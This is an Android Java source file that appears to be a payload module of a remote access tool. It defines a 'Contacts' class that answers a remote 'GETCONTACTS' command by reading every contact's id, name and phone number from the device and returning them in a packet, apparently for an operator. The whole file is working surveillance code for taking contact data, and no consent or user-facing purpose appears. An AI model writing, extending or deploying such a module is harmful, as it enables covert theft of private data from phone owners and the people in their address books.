package com.core.payloads;

import android.app.Activity;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import com.corelib.IPayload;
import com.corelib.Packet;

import java.util.ArrayList;

/**
 * Contacts class
 * Created by hkff on 4/22/15.
 */
public class Contacts implements IPayload {

    //-----------------------------------------------------------//
    public enum Commands {
        GETCONTACTS,
    }

    @Override
    public String man() {
        return "";
    }

    /***
     * Handle msg
     * @param msg
     * @return
     */
    @Override
    public Packet handle(Packet msg) {
        // The result to return
        Packet result = new Packet("NO_COMMAND_PROVIDED", Packet.Type.STRING);

        // Get the command (and convert it to uppercase)
        String cmd0 = msg.getMsg().toUpperCase();

        // Check if the command exists in our Commands enumeration
        Commands cmd;
        try{
            cmd = Commands.valueOf(cmd0);
        } catch (IllegalArgumentException e){
            // If there is no command, we return an error message
            result.setType(Packet.Type.NONE);
            return result;
        }

        // Parse args
        String[] tmp = new String(msg.getContent()).split(":");

        // We handle the command
        switch (cmd){
            // Get contacts
            // Protocol : GETCONTACTS
            case GETCONTACTS:
                result.setMsg(this.getContacts());
                break;
        }

        return result;
    }
    //-----------------------------------------------------------//

    /**
     * Contact Packet class
     */
    class PacketContact {

        private String id;
        private String name;
        private String num;

        public PacketContact() {}

        public PacketContact(String id, String name, String num) {
            this.id = id;
            this.name = name;
            this.num = num;
        }

        public String toString() {
            return "" +
                    " - Id : " + this.id +
                    " - Name : " + this.name +
                    " - Num : " + this.num;
        }
    }

    // Attributes
    public Activity app;

    @Override
    public void setApp(Activity app) {
        this.app = app;
    }

    public Contacts(){}

    /**
     * Constructor
     * @param app
     */
    public Contacts(Activity app){
        this.app = app;
    }


    /**
     * Get all Contacts
     */
    public String getContacts() {
        String result = "";
        ArrayList<PacketContact> l = new ArrayList<>();
        String WHERE_CONDITION = "";
        String SORT_ORDER = "";
        String[] column = null;
        Uri CONTENT_URI = ContactsContract.Contacts.CONTENT_URI;

        Cursor cursor = app.getContentResolver().query(CONTENT_URI, column , WHERE_CONDITION, null, SORT_ORDER);
        if(cursor.getCount() != 0) {
            cursor.moveToFirst();

            do{
                if(cursor.getColumnCount() != 0) {
                    String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                    String num = "";
                    if (Integer.parseInt(cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                        Cursor pCur = app.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[]{id}, null);
                        if (pCur.moveToNext()) {
                            num = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                        }
                        pCur.close();
                    }
                    l.add(new PacketContact(id, name, num));
                }
            } while(cursor.moveToNext());
        }
        cursor.close();

        // Convert the list to string
        for(PacketContact contact: l){
            result += "\n" + contact.toString();
        }

        return result;
    }
}